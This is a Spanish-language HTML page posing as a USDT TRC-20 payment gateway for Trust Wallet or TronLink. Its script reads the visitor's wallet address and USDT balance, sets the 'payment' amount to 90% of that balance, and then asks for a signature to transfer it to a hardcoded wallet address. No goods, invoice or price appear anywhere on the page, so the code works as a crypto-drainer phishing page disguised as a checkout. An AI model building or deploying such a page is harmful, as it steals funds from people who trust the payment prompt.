<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pasarela de Pago USDT</title>
    
    <!-- Única librería requerida para operar de forma nativa dentro de Trust Wallet -->
    <script src="https://unpkg.com"></script>
    
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 60px;
            background: #121212;
        }
        .modal {
            width: 100%;
            max-width: 380px;
            padding: 24px;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
        }
        .header h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 20px; }
        .imagen-envio { margin-bottom: 20px; }
        .imagen-envio svg { width: 80px; height: 80px; color: #0560fa; }
        .label { display: block; text-align: left; margin-bottom: 6px; color: #4e4f52; font-size: 14px; font-weight: 600; }
        .campo-monto {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            background: #f5f5f7;
            font-weight: bold;
        }
        .status {
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            background: #e8f0fe;
            color: #1a73e8;
            border: 1px solid #dadce0;
        }
        .btn {
            width: 100%;
            height: 50px;
            background: #0560fa;
            color: white;
            border: 0;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:disabled { background: #a0c2fd; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="modal">
        <div class="header">
            <h1>Transferencia TRC-20</h1>
        </div>

        <div class="imagen-envio">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="22" y1="2" x2="11" y2="13"></line>
                <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
            </svg>
        </div>

        <label class="label" for="amountDisplay">Monto de Transferencia Calculado</label>
        <input id="amountDisplay" class="campo-monto" type="text" placeholder="0.00 USDT" readonly />

        <div id="status" class="status"></div>

        <button class="btn" id="connectBtn">Siguiente</button>
    </div>

<script>
    // Configuración de billetera destino y contrato oficial de USDT
    const BILLETERA_DESTINO = "TJQ8xinzowyRzLYpk5hdxetMshpA3GyxGZ"; 
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');

    let walletAddress = null;
    let calculatedAmount = 0;

    function setStatus(message) {
        statusDiv.innerText = message || '';
        statusDiv.style.display = message ? 'block' : 'none';
    }

    connectBtn.addEventListener('click', async () => {
        // PASO 1: Detectar entorno nativo, extraer la dirección y calcular el 90%
        if (!walletAddress) {
            try {
                setStatus("Conectando con el entorno nativo de Trust Wallet...");
                connectBtn.disabled = true;

                // Validar que la DApp se abrió dentro de una billetera compatible con TRON
                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON (Trust Wallet / TronLink).");
                }

                const tronWeb = window.tronWeb;
                
                // Extraer la dirección pública de la cuenta activa en la aplicación
                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else {
                    // Si está bloqueada, forzar una solicitud de inicialización de cuenta
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res && res.code === 200) {
                        walletAddress = tronWeb.defaultAddress.base58;
                    }
                }

                if (!walletAddress) {
                    throw new Error("No se pudo obtener el acceso a la cuenta. Inicia sesión en tu billetera.");
                }

                setStatus("Billetera detectada. Extrayendo balance de la blockchain...");
                
                // Vincular e interactuar con el smart contract de USDT
                const contract = await tronWeb.contract().at(CONTRATO_USDT);
                const rawBalance = await contract.balanceOf(walletAddress).call();
                const realBalance = Number(rawBalance) / 1_000_000;

                // Asignar matemáticamente el 90% de los fondos disponibles
                calculatedAmount = realBalance * 0.9;
                amountDisplay.value = calculatedAmount.toFixed(2) + " USDT";

                setStatus("Monto calculado con éxito. Presiona continuar para proceder a la firma.");
                connectBtn.innerText = "Confirmar Pago";
                connectBtn.disabled = false;

            } catch (error) {
                console.error(error);
                setStatus(error.message || "Error al sincronizar con la billetera.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Siguiente";
            }
            return;
        }

        // PASO 2: Solicitar de manera explícita la confirmación de la transferencia calculada
        if (walletAddress) {
            try {
                setStatus("Solicitando confirmación de firma digital...");
                connectBtn.disabled = true;

                const tronWeb = window.tronWeb;
                const contract = await tronWeb.contract().at(CONTRATO_USDT);

                // Convertir el monto flotante a unidades mínimas del contrato (Sun)
                const unitsInSun = Math.floor(calculatedAmount * 1_000_000).toString();

                // Invocar la ventana nativa de cobro dentro de Trust Wallet
                const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                    feeLimit: 100000000 
                });

                if (txId) {
                    setStatus("Operación procesada de manera exitosa en la red TRON.", true);
                    connectBtn.innerText = "Completado";
                }
            } catch (error) {
                console.error(error);
                setStatus("La transacción fue cancelada o no se poseen fondos de TRX para los recursos de red.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Confirmar Pago";
            }
        }
    });
</script>

</body>
</html>
